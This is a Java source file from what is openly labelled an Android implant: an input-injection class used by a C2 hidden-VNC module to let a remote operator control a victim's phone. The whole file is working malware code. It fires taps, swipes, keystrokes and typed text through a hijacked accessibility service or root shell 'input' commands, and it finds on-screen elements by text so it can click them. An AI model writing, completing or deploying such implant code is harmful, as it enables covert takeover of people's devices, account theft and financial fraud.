// ============================================================
// FILE: payload/module/src/main/java/io/hackerai/implant/vnc/InputInjector.java
// ============================================================
package io.hackerai.implant.vnc;

import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;

import io.hackerai.implant.persist.AccessibilityHook;

/**
 * InputInjector — inject touch/swipe/type gestures through
 * AccessibilityService, or via shell input events (root).
 *
 * Used by the C2 HVNC module to send user interactions from
 * the operator back to the device.
 */
public class InputInjector {
    private static final String TAG = "InputInjector";

    private final Context ctx;
    private AccessibilityHook a11yHook;

    public InputInjector(Context context) {
        this.ctx = context.getApplicationContext();
    }

    /** Set reference to the active AccessibilityHook. */
    public void setAccessibilityHook(AccessibilityHook hook) {
        this.a11yHook = hook;
    }

    /**
     * Tap at screen coordinates.
     * Falls back: A11y gesture → shell input tap → error.
     */
    public boolean tap(int x, int y) {
        Log.d(TAG, "tap(" + x + ", " + y + ")");
        // Method 1: Accessibility gesture (no root)
        if (a11yHook != null && a11yHook.isConnected()
                && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 50));
            boolean result = a11yHook.dispatchGesture(
                    builder.build(),
                    null,
                    null
            );
            if (result) {
                Log.d(TAG, "tap via A11y gesture succeeded");
                return true;
            }
        }

        // Method 2: shell input tap (requires root or ADB)
        String output = io.hackerai.implant.utils.ShellUtils.execute(
                "input tap " + x + " " + y);
        if (output != null && !output.contains("ERROR")) {
            Log.d(TAG, "tap via shell succeeded");
            return true;
        }

        Log.w(TAG, "tap failed");
        return false;
    }

    /**
     * Swipe from (x1,y1) to (x2,y2).
     */
    public boolean swipe(int x1, int y1, int x2, int y2, long durationMs) {
        Log.d(TAG, "swipe(" + x1 + "," + y1 + " → " + x2 + "," + y2 + ")");

        if (a11yHook != null && a11yHook.isConnected()
                && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, durationMs));
            boolean result = a11yHook.dispatchGesture(
                    builder.build(),
                    null,
                    null
            );
            if (result) return true;
        }

        String output = io.hackerai.implant.utils.ShellUtils.execute(
                "input swipe " + x1 + " " + y1 + " " + x2 + " " + y2 + " " + durationMs);
        if (output != null && !output.contains("ERROR")) return true;

        return false;
    }

    /**
     * Type text characters (via shell input text).
     */
    public boolean typeText(String text) {
        Log.d(TAG, "typeText(" + text + ")");
        // Escape single quotes for shell
        String escaped = text.replace("'", "'\\''");
        String output = io.hackerai.implant.utils.ShellUtils.execute(
                "input text '" + escaped + "'");
        return output == null || !output.contains("ERROR");
    }

    /**
     * Press a key event (KEYCODE_*).
     */
    public boolean keyPress(int keyCode) {
        Log.d(TAG, "keyPress(" + keyCode + ")");
        String output = io.hackerai.implant.utils.ShellUtils.execute(
                "input keyevent " + keyCode);
        return output == null || !output.contains("ERROR");
    }

    /**
     * Long press at coordinates.
     */
    public boolean longPress(int x, int y) {
        return tap(x, y); // Accessibility gesture supports duration via StrokeDescription
    }

    /** Find UI element by text and tap it (A11y tree walk). */
    public boolean tapByText(String text) {
        if (a11yHook == null || !a11yHook.isConnected()) return false;

        AccessibilityNodeInfo root = a11yHook.getRootInActiveWindow();
        if (root == null) return false;

        AccessibilityNodeInfo target = findNodeByText(root, text);
        if (target != null) {
            Rect rect = new Rect();
            target.getBoundsInScreen(rect);
            target.recycle();
            root.recycle();
            return tap(rect.centerX(), rect.centerY());
        }
        root.recycle();
        return false;
    }

    /** Walk the A11y tree looking for a node with matching text. */
    private AccessibilityNodeInfo findNodeByText(
            AccessibilityNodeInfo node, String text) {
        if (node == null) return null;
        CharSequence nodeText = node.getText();
        if (nodeText != null && nodeText.toString().contains(text)) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo result = findNodeByText(child, text);
            if (result != null) return result;
        }
        return null;
    }
            }
